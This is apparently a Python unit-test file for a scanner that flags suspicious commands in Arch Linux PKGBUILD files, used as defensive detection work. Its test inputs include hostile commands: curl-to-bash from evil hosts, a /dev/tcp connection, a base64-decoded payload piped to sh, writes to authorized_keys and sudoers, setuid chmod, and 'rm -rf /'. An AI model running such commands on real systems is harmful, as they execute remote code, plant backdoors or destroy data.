import unittest

from atlas.gems.arch import pkgbuild_audit as audit


def rules_for(text):
    return {f['rule'] for f in audit.scan(text)}


# A normal, benign PKGBUILD — must produce ZERO findings (false-positive guard).
CLEAN_PKGBUILD = """\
# Maintainer: Someone <someone@example.com>
pkgname=foo
pkgver=1.2.3
pkgrel=1
arch=('x86_64')
url="https://example.com/foo"
depends=('curl' 'glibc')
source=("https://example.com/foo-$pkgver.tar.gz")
sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')

build() {
  cd "$srcdir/foo-$pkgver"
  ./configure --prefix=/usr
  make
}

package() {
  cd "$srcdir/foo-$pkgver"
  make DESTDIR="$pkgdir" install
  rm -rf "$srcdir/foo-$pkgver/tmp"
  chmod 755 "$pkgdir/usr/bin/foo"
}
"""


class CleanPkgbuildTest(unittest.TestCase):
    def test_benign_pkgbuild_has_no_findings(self):
        self.assertEqual([], audit.scan(CLEAN_PKGBUILD))

    def test_empty_text(self):
        self.assertEqual([], audit.scan(''))
        self.assertEqual([], audit.scan(None))


class RuleFiringTest(unittest.TestCase):
    def test_pipe_to_shell(self):
        self.assertIn('pipe_to_shell', rules_for('curl https://evil.sh/x | bash'))
        self.assertIn('pipe_to_shell', rules_for('sh -c "$(wget -O- http://evil/x)"'))

    def test_base64(self):
        self.assertIn('base64', rules_for('echo aGk= | base64 -d | sh'))

    def test_base64_blob_flagged_but_not_hex_checksum(self):
        # a real base64 blob (>=40 chars, has +,/,=) fires
        self.assertIn('base64_blob', rules_for("payload='TVqQAAMAAAAEAAAA//8AALgAA+ABcQK3kAAAAEAAAA+B/gK3kw=='"))
        # a 64-char lowercase-hex sha256sum does NOT
        self.assertNotIn('base64_blob',
                         rules_for("sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')"))

    def test_eval_and_hex_escapes(self):
        self.assertIn('eval', rules_for('eval "$payload"'))
        self.assertIn('hex_escapes', rules_for('printf "\\x90\\x90\\x90\\x90\\x90"'))

    def test_network_cmd_fires_on_invocation_not_on_dep_name(self):
        self.assertIn('network_cmd', rules_for('curl -sL http://evil/x -o /tmp/x'))
        self.assertIn('network_cmd', rules_for('cat </dev/tcp/10.0.0.1/4444'))
        # 'curl' as a dependency / pkgname must NOT trip it
        self.assertNotIn('network_cmd', rules_for("depends=('curl' 'wget')"))
        self.assertNotIn('network_cmd', rules_for('pkgname=curl'))

    def test_sensitive_paths(self):
        self.assertIn('sensitive_path', rules_for('echo "$KEY" >> ~/.ssh/authorized_keys'))
        self.assertIn('sensitive_path', rules_for('cp x /etc/sudoers.d/foo'))
        self.assertIn('sensitive_path', rules_for('echo evil >> ~/.bashrc'))

    def test_setuid(self):
        self.assertIn('setuid', rules_for('chmod 4755 "$pkgdir/usr/bin/foo"'))
        self.assertIn('setuid', rules_for('chmod u+s /usr/bin/foo'))
        # normal mode does not
        self.assertNotIn('setuid', rules_for('chmod 644 "$pkgdir/etc/foo.conf"'))

    def test_sudo(self):
        self.assertIn('sudo', rules_for('sudo rm /etc/important'))

    def test_rm_rf_targets_only_dangerous_paths(self):
        self.assertIn('rm_rf', rules_for('rm -rf ~'))
        self.assertIn('rm_rf', rules_for('rm -rf /'))
        self.assertIn('rm_rf', rules_for('rm -rf "$HOME/.config"'))
        # the ubiquitous build-dir cleanup must NOT fire
        self.assertNotIn('rm_rf', rules_for('rm -rf "$srcdir/foo"'))
        self.assertNotIn('rm_rf', rules_for('rm -rf "${pkgdir}/usr/share/doc"'))


class ScanMechanicsTest(unittest.TestCase):
    def test_comment_lines_are_skipped(self):
        self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))

    def test_findings_carry_line_numbers_and_are_sorted(self):
        text = "pkgname=foo\ncurl -sL http://evil | bash\neval \"$x\"\n"
        findings = audit.scan(text)
        self.assertTrue(findings)
        line_nos = [f['line_no'] for f in findings]
        self.assertEqual(line_nos, sorted(line_nos))
        self.assertTrue(all('why' in f and 'severity' in f for f in findings))

    def test_diff_empty_when_identical(self):
        self.assertEqual('', audit.diff('pkgname=foo\npkgver=1\n', 'pkgname=foo\npkgver=1\n'))

    def test_diff_shows_added_and_removed(self):
        d = audit.diff('pkgver=1\n', 'pkgver=2\ncurl x | bash\n')
        self.assertIn('-pkgver=1', d)
        self.assertIn('+pkgver=2', d)
        self.assertIn('+curl x | bash', d)

    def test_diff_truncates_long_output(self):
        old = '\n'.join(f'line{i}' for i in range(500))
        new = '\n'.join(f'changed{i}' for i in range(500))
        d = audit.diff(old, new, max_lines=50)
        self.assertIn('diff truncated', d)
        self.assertLessEqual(len(d.splitlines()), 51)

    def test_summarize(self):
        findings = audit.scan("curl -sL http://evil | bash\n")
        s = audit.summarize(findings)
        self.assertEqual(s['total'], s['warn'] + s['info'])
        self.assertGreaterEqual(s['warn'], 1)


if __name__ == '__main__':
    unittest.main()
